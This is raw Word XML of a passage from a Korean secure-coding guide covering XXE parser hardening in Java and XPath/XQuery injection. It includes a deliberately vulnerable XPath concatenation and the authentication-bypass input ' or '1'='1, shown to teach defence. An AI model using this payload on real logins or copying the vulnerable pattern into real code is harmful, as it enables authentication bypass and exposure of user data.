                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>엔티티</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>처리</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비활성화</w:t>
            </w:r>
            <w:r w:rsidR="002D3108">
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:eastAsia="맑은 고딕" w:hAnsi="Courier New" w:hint="eastAsia"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="002D3108">
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:eastAsia="맑은 고딕" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">– </w:t>
            </w:r>
            <w:r w:rsidR="002D3108">
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:eastAsia="맑은 고딕" w:hAnsi="Courier New" w:hint="eastAsia"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파서의</w:t>
            </w:r>
            <w:r w:rsidR="002D3108">
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:eastAsia="맑은 고딕" w:hAnsi="Courier New" w:hint="eastAsia"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="002D3108">
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:eastAsia="맑은 고딕" w:hAnsi="Courier New" w:hint="eastAsia"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>기능을</w:t>
            </w:r>
            <w:r w:rsidR="002D3108">
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:eastAsia="맑은 고딕" w:hAnsi="Courier New" w:hint="eastAsia"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="002D3108">
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:eastAsia="맑은 고딕" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>OFF</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>DocumentBuilder db = dbf.newDocumentBuilder();</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRPr="005D7EC4" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  9. XML </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>삽입</w:t>
      </w:r>
      <w:r w:rsidR="005D7EC4">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005D7EC4">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">– RDB </w:t>
      </w:r>
      <w:r w:rsidR="005D7EC4">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>이외</w:t>
      </w:r>
      <w:r w:rsidR="005D7EC4">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005D7EC4">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>파일</w:t>
      </w:r>
      <w:r w:rsidR="005D7EC4">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005D7EC4">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Database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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• XQuery/XPath </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>쿼리에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사용되는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외부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입력값에서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특수문자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및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쿼리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예약어를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필터링한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파라미터화된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쿼리문을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지원하는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> XQuery</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>를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사용한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> XPath </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>문자열에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>직접</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>연결</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String xpath = "//user[id='" + id + "' and pwd='" + pwd + "']";</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// id</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> ' or '1'='1 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인증</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>우회</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">XPath </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>쿼리의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> id </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>필드에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> ' or '1'='1 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>조건이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>항상</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>참이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>되어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> XML </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>저장소의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>모든</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>데이터가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>반환됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. SQL </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>삽입과</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>동일하게</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인증을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>완전히</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
